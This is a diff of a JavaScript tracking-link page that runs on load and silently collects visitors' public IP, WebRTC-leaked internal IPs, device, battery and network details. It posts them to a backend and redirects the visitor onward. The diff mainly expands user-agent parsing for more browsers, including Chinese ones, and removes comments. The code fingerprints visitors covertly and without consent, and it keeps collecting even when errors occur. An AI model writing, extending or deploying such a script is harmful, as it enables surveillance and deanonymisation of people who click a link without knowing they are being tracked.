@@ -3,7 +3,7 @@
  * 
  * 采集用户网络/设备/电池/网络类型等信息，通过 WebRTC 获取内网 IP，
  * 所有采集完成后上报到后端并跳转到预设页面。
- * 兼容 ES5 语法，支持 Chrome/Firefox/Safari/Edge。
+ * 兼容 ES5 语法，支持 Chrome/Firefox/Safari/Edge/国产浏览器。
  */
 (function() {
     'use strict';
@@ -11,45 +11,82 @@
     /* ====== 全局变量 ====== */
     var LINK_ID = window.LINK_ID || '';
     var REDIRECT_URL = '';
-    var MAX_WAIT = 5000; // 5秒超时兜底
+    var MAX_WAIT = 5000;
 
 
     /* ====== 辅助函数 ====== */
 
     /**
-     * 简单 UA 解析 — 提取操作系统和浏览器名称
-     * @param {string} ua - 原始 User-Agent 字符串
-     * @returns {{os: string, browser: string}}
+     * UA 解析 — 提取操作系统和浏览器名称（增强版）
      */
     function parseUA(ua) {
         var os = '未知';
         var browser = '未知';
 
-        // 解析操作系统
-        if (/Windows NT (\d+\.\d+)/.test(ua)) {
-            var winVer = RegExp.$1;
-            if (winVer === '10.0') os = 'Windows 10';
-            else if (winVer === '11.0') os = 'Windows 11';
-            else os = 'Windows';
-        } else if (/Mac OS X (\d+[._]\d+[._]\d+)/.test(ua)) {
-            os = 'macOS';
-        } else if (/Linux/.test(ua) && !/Android/.test(ua)) {
+        // === 操作系统 ===
+        if (/Windows Phone/.test(ua)) {
+            os = 'Windows Phone';
+        } else if (/Windows NT 10\.0/.test(ua)) {
+            os = /ARM|Touch/.test(ua) ? 'Windows RT' : 'Windows 10';
+        } else if (/Windows NT 6\.3/.test(ua)) {
+            os = 'Windows 8.1';
+        } else if (/Windows NT 6\.2/.test(ua)) {
+            os = 'Windows 8';
+        } else if (/Windows NT 6\.1/.test(ua)) {
+            os = 'Windows 7';
+        } else if (/Windows NT/.test(ua)) {
+            os = 'Windows';
+        } else if (/Android[\s/](\d+[\.\d]*)/.test(ua)) {
+            os = 'Android ' + RegExp.$1;
+        } else if (/iPhone OS (\d+[_\d]*)/.test(ua)) {
+            os = 'iOS ' + RegExp.$1.replace(/_/g, '.');
+        } else if (/iPad.*OS (\d+[_\d]*)/.test(ua)) {
+            os = 'iPadOS ' + RegExp.$1.replace(/_/g, '.');
+        } else if (/Mac OS X (\d+[._]\d+[._\d]*)/.test(ua)) {
+            os = 'macOS ' + RegExp.$1.replace(/_/g, '.');
+        } else if (/CrOS/.test(ua)) {
+            os = 'Chrome OS';
+        } else if (/Linux/.test(ua)) {
             os = 'Linux';
-        } else if (/Android (\d+(\.\d+)*)/.test(ua)) {
-            os = 'Android';
-        } else if (/iPhone OS (\d+_\d+)/.test(ua)) {
-            os = 'iOS';
+        } else if (/HarmonyOS/.test(ua)) {
+            os = 'HarmonyOS';
         }
 
-        // 解析浏览器
-        if (/Edg\/(\d+)/.test(ua)) {
+        // === 浏览器（顺序很重要，先匹配特有标识） ===
+        if (/Edg(?:e|iOS|A)?\/(\d+)/.test(ua)) {
             browser = 'Edge ' + RegExp.$1;
-        } else if (/Chrome\/(\d+)/.test(ua) && !/Edg\//.test(ua)) {
+        } else if (/OPR\/(\d+)/.test(ua) || /Opera/.test(ua)) {
+            browser = 'Opera ' + (RegExp.$1 || '');
+        } else if (/UCBrowser\/(\d+)/.test(ua)) {
+            browser = 'UC ' + RegExp.$1;
+        } else if (/QQBrowser\/(\d+)/.test(ua)) {
+            browser = 'QQ浏览器 ' + RegExp.$1;
+        } else if (/MiuiBrowser\/(\d+)/.test(ua)) {
+            browser = '小米浏览器 ' + RegExp.$1;
+        } else if (/HuaweiBrowser\/(\d+)/.test(ua)) {
+            browser = '华为浏览器 ' + RegExp.$1;
+        } else if (/BIDUBrowser\/(\d+)/.test(ua)) {
+            browser = '百度 ' + RegExp.$1;
+        } else if (/SogouMobileBrowser/.test(ua)) {
+            browser = '搜狗浏览器';
+        } else if (/Vivaldi\/(\d+)/.test(ua)) {
+            browser = 'Vivaldi ' + RegExp.$1;
+        } else if (/Brave/.test(ua)) {
+            browser = 'Brave';
+        } else if (/SamsungBrowser\/(\d+)/.test(ua)) {
+            browser = '三星浏览器 ' + RegExp.$1;
+        } else if (/CriOS\/(\d+)/.test(ua)) {
+            browser = 'Chrome(iOS) ' + RegExp.$1;
+        } else if (/FxiOS\/(\d+)/.test(ua)) {
+            browser = 'Firefox(iOS) ' + RegExp.$1;
+        } else if (/Chrome\/(\d+)/.test(ua)) {
             browser = 'Chrome ' + RegExp.$1;
         } else if (/Firefox\/(\d+)/.test(ua)) {
             browser = 'Firefox ' + RegExp.$1;
-        } else if (/Version\/(\d+).*Safari/.test(ua) && !/Chrome/.test(ua)) {
+        } else if (/Version\/(\d+).*Safari/.test(ua)) {
             browser = 'Safari ' + RegExp.$1;
+        } else if (/MSIE (\d+)/.test(ua) || /Trident.*rv:(\d+)/.test(ua)) {
+            browser = 'IE ' + (RegExp.$1 || '');
         }
 
         return { os: os, browser: browser };
@@ -60,7 +97,6 @@
 
     /**
      * 获取公网 IP 信息（通过后端 API 代理请求）
-     * @returns {Promise}
      */
     function fetchIpInfo() {
         return fetch((window.SITE_URL || '') + '/api.php?action=get_ip')
@@ -72,14 +108,12 @@
 
     /**
      * 通过 WebRTC 获取内网 IP
-     * @returns {Promise<string[]>}
      */
     function getWebRTCIPs() {
         return new Promise(function(resolve) {
             var ips = [];
             var resolved = false;
 
-            // 浏览器不支持 WebRTC 时直接返回空数组
             if (!window.RTCPeerConnection && !window.webkitRTCPeerConnection && !window.mozRTCPeerConnection) {
                 resolve([]);
                 return;
@@ -88,18 +122,14 @@
             var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
             var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 
-            // 创建数据通道以触发 ICE 候选收集
             try {
                 pc.createDataChannel('');
-            } catch (e) {
-                // 某些浏览器可能不支持
-            }
+            } catch (e) {}
 
             pc.onicecandidate = function(event) {
                 if (!event.candidate || !event.candidate.candidate) {
                     return;
                 }
-
                 var candidate = event.candidate.candidate;
                 var ipRegex = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})|([a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})/i;
                 var match = candidate.match(ipRegex);
@@ -113,11 +143,8 @@
                 .then(function(offer) {
                     return pc.setLocalDescription(offer);
                 })
-                .catch(function() {
-                    // 静默处理
-                });
+                .catch(function() {});
 
-            // 3 秒超时
             setTimeout(function() {
                 if (!resolved) {
                     resolved = true;
@@ -130,7 +157,6 @@
 
     /**
      * 采集设备信息
-     * @returns {Promise<object>}
      */
     function getDeviceInfo() {
         return new Promise(function(resolve) {
@@ -149,7 +175,6 @@
 
     /**
      * 采集电池信息
-     * @returns {Promise<object>}
      */
     function getBatteryInfo() {
         return new Promise(function(resolve) {
@@ -173,7 +198,6 @@
 
     /**
      * 采集网络信息
-     * @returns {Promise<object>}
      */
     function getNetworkInfo() {
         return new Promise(function(resolve) {
@@ -193,7 +217,6 @@
 
     /**
      * 获取跳转目标 URL
-     * @returns {Promise<object>}
      */
     function getRedirectUrl() {
         return fetch((window.SITE_URL || '') + '/api.php?action=collect_info&id=' + encodeURIComponent(LINK_ID))
@@ -211,23 +234,18 @@
 
     /**
      * 上报采集数据到后端
-     * @param {object} data
-     * @returns {Promise}
      */
     function reportData(data) {
         return fetch((window.SITE_URL || '') + '/api.php?action=save', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
-        }).catch(function() {
-            // 静默失败
-        });
+        }).then(function(resp) { return resp.json(); })
+          .catch(function() {});
     }
 
     /**
      * 从采集结果中拼装完整上报数据
-     * @param {Array} results - Promise.allSettled 的结果数组
-     * @returns {object}
      */
     function buildData(results) {
         // results 顺序：[ipInfo, webrtcIPs, deviceInfo, batteryInfo, networkInfo, redirectUrl]
@@ -270,7 +288,6 @@
 
     /* ====== 主流程 ====== */
 
-    // 并行执行所有采集任务
     Promise.allSettled([
         fetchIpInfo(),
         getWebRTCIPs(),
@@ -284,7 +301,6 @@
     }).then(function() {
         doRedirect();
     }).catch(function() {
-        // 即使失败也跳转
         doRedirect();
     });
 
